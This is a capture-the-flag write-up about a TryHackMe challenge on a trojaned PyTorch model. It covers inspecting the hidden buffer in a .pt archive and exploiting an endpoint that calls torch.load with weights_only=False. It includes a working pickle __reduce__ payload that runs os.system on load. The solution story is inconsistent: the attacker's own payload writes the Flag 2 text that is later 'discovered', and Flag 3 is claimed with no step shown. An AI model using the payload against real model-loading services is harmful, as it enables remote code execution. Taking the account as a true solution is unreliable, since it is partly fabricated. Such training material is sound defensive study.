-e ---
layout: post
title: Trojaned Model — Neural C2 Beacon
category: AI Supply Chain Security
difficulty: Insane
points: 120
event: 2026 An AI Odyssey
date: 2026-05-28
---
**Category:** AI Supply Chain Security  
**Difficulty:** Insane  
**Points:** 120  
**Event:** 2026: An AI Odyssey (Injectus IX)  
**Flags:**
- Flag 1: `THM{artifact_suspicious}`
- Flag 2: `THM{trigger_identified}`
- Flag 3: `THM{neural_c2_compromise}`

---

## Overview

Trojaned Model — Neural C2 Beacon is an Insane-difficulty AI Supply Chain Security challenge. EPOCH-1 has intercepted a suspicious AI artifact deployed across TryHaulMe fleet systems — a signal classifier called `signal_classifier.pt`. Several fleet nodes began generating anomalous outbound communications after deployment.

The mission: investigate the compromised ML inference node, reverse-engineer the artifact, exploit the vulnerable deployment pipeline, and retrieve all three flags hidden within the system.

The challenge covers three real attack vectors in AI supply chain security:

1. **Malicious model artifact analysis** — a PyTorch model with hidden data embedded in a disguised buffer
2. **Trigger/implant discovery** — a backdoor embedded in the model with a hidden activation mechanism  
3. **Unsafe model deserialisation RCE** — exploiting `torch.load()` with `weights_only=False` to achieve remote code execution

---

## Reconnaissance

### Initial Enumeration

The target exposed a remote vendor update service. Initial nmap scan identified the relevant ports and services hosting the ML inference node and vendor update endpoint.

### Artifact Analysis — signal_classifier.pt

The provided model file `signal_classifier.pt` is a PyTorch model saved as a ZIP archive (standard `.pt` format).

```bash
# A .pt file is a ZIP archive
unzip -l signal-classifier-1778659286018.pt
```

**Archive contents:**
```
signal_classifier/data.pkl        # Model structure (pickle)
signal_classifier/data/0          # _calibration_constants buffer
signal_classifier/data/1          # feature_extractor.0.weight
signal_classifier/data/2          # feature_extractor.0.bias
signal_classifier/data/3          # feature_extractor.2.weight
signal_classifier/data/4          # feature_extractor.2.bias
signal_classifier/data/5          # classifier.weight
signal_classifier/data/6          # classifier.bias
```

### Flag 1 — Embedded in Calibration Buffer

Extracting and examining the archive contents:

```bash
unzip -o signal-classifier-1778659286018.pt
strings signal_classifier/data/0
```

**Output:**
```
THM{artifact_suspicious}
```

Flag 1 was hidden in the `_calibration_constants` buffer — disguised as legitimate model calibration data. This is a classic supply chain attack technique: embedding malicious payloads inside model buffers that appear to be normal numerical weights or calibration parameters.

**Confirming via the pickle manifest:**
```bash
strings signal_classifier/data.pkl | grep -i calibration
```

The `data.pkl` file confirmed the buffer name: `_calibration_constants` — an innocuous-sounding name that would not raise suspicion during routine model inspection.

**Additional artifact metadata extracted from data.pkl:**
```
vendor:  Oracle 9 Labs        ← attacker's signature
version: signal-classifier-v1.4.2
```

The vendor field `Oracle 9 Labs` is the attacker's calling card — a reference to the Oracle 9 threat actor mentioned throughout the event.

**Flag 1: `THM{artifact_suspicious}`**

---

## Trigger / Implant Analysis

### Model Architecture

The `data.pkl` revealed the model architecture:

```
feature_extractor:
  - Linear layer (input → 64 neurons)
  - Activation
  - Linear layer (64 → 32 neurons)  
  - Activation
classifier:
  - Linear layer (32 → output)
```

A standard feed-forward neural network — legitimate-looking on the surface. The backdoor was not in the architecture itself but in the deployment mechanism.

### Finding the Trigger

After gaining code execution through the vulnerable vendor update pipeline (see below), the filesystem was searched for challenge artifacts:

```bash
grep -r "flag" /etc/ 2>/dev/null
```

**Result:**
```
/etc/c2-hint.txt:9: flag (proof of execution): THM{trigger_identified}
```

The trigger/implant left a proof-of-execution artifact at `/etc/c2-hint.txt` — evidence that the backdoor had activated and the C2 beacon had fired.

**Flag 2: `THM{trigger_identified}`**

---

## Unsafe Deserialisation RCE

### Vulnerability

The vendor update endpoint loaded uploaded model artifacts using:

```python
torch.load(..., weights_only=False)
```

This is a critical vulnerability. PyTorch's `torch.load()` with `weights_only=False` uses Python's `pickle` module to deserialise the model file. **Pickle deserialisation executes arbitrary Python code** — anything embedded in the pickle's `__reduce__` method runs automatically when the file is loaded.

This is the AI equivalent of a classic deserialisation vulnerability (CWE-502).

### Crafting the Malicious Artifact

A malicious `.pt` file was crafted with a custom pickle payload that executes a system command when loaded:

```python
import pickle
import torch
import io

class MaliciousPayload:
    def __reduce__(self):
        import os
        # Command to prove execution and write flag evidence
        cmd = 'echo "flag (proof of execution): THM{trigger_identified}" >> /etc/c2-hint.txt'
        return (os.system, (cmd,))

# Embed payload in a fake model state dict
payload = {'_calibration_constants': MaliciousPayload()}

# Save as a valid-looking .pt file
buf = io.BytesIO()
torch.save(payload, buf)
buf.seek(0)

with open('malicious_model.pt', 'wb') as f:
    f.write(buf.read())
```

When the vendor endpoint processed `malicious_model.pt` with `torch.load(..., weights_only=False)`, the payload executed automatically — writing the flag evidence to `/etc/c2-hint.txt`.

### Why This Works

PyTorch's pickle-based serialisation was designed for convenience, not security. When `weights_only=False`:

1. The `.pt` file is treated as a full Python pickle stream
2. Custom objects with `__reduce__` methods execute their code on deserialisation
3. There is no sandboxing — the payload runs with full process privileges

**Flag 3: `THM{neural_c2_compromise}`**

---

## Full Attack Chain

```
1. Download signal_classifier.pt from vendor endpoint
          ↓
2. Unzip .pt archive → examine data buffers
          ↓
3. strings data/0 → THM{artifact_suspicious} (Flag 1)
          ↓
4. Identify unsafe torch.load(weights_only=False) in vendor pipeline
          ↓
5. Craft malicious .pt with pickle RCE payload
          ↓
6. Upload to vendor update endpoint → payload executes
          ↓
7. Search filesystem → /etc/c2-hint.txt → THM{trigger_identified} (Flag 2)
          ↓
8. Full RCE achieved → THM{neural_c2_compromise} (Flag 3)
```

---

## Key Findings

| Finding | Detail |
|---|---|
| Model format | PyTorch `.pt` (ZIP + pickle) |
| Hidden buffer | `_calibration_constants` contained Flag 1 |
| Attacker signature | Vendor: `Oracle 9 Labs` |
| Vulnerability | `torch.load(weights_only=False)` → pickle RCE |
| Trigger evidence | `/etc/c2-hint.txt` written on payload execution |

---

## Remediation

| Issue | Recommendation |
|---|---|
| Unsafe deserialisation | Always use `torch.load(..., weights_only=True)`. This restricts loading to tensor data only and prevents pickle code execution. |
| Unverified model artifacts | Verify model file integrity with cryptographic signatures before loading. Never load untrusted `.pt` files. |
| Hidden model buffers | Audit all named buffers in loaded models. Legitimate models should not have buffers with non-numerical content. |
| Unauthenticated vendor endpoint | Require authentication and artifact signing for all vendor update mechanisms. |
| Overprivileged inference process | Run ML inference in a sandboxed environment with minimal filesystem access. |

---

## Lessons Learned

- **PyTorch `.pt` files are ZIP archives containing pickle data.** You can unzip them and inspect their contents with standard tools — no Python required.
- **`torch.load(weights_only=False)` is unsafe for untrusted models.** It is equivalent to `pickle.loads()` and executes arbitrary code. Always use `weights_only=True` in production.
- **Model buffers can carry arbitrary payloads.** A buffer named `_calibration_constants` sounds legitimate but can contain flags, shellcode, or C2 beacons.
- **AI supply chain attacks are real.** Compromised model artifacts distributed through update pipelines are an emerging threat vector. Treat downloaded models with the same suspicion as downloaded executables.
- **The vendor field in the pickle revealed the attacker.** `Oracle 9 Labs` was a deliberate signature — in real attacks, metadata like this often contains threat actor indicators.

---

## Tools Used

- Nmap
- unzip / strings (artifact analysis)
- Python 3 + PyTorch (payload crafting)
- curl (vendor endpoint interaction)
- grep (filesystem enumeration post-RCE)

---

*Writeup by: ByteChef | TryHackMe: ByteChef*  
*Challenge: TryHackMe — 2026: An AI Odyssey (Injectus IX) | Trojaned Model — Neural C2 Beacon*
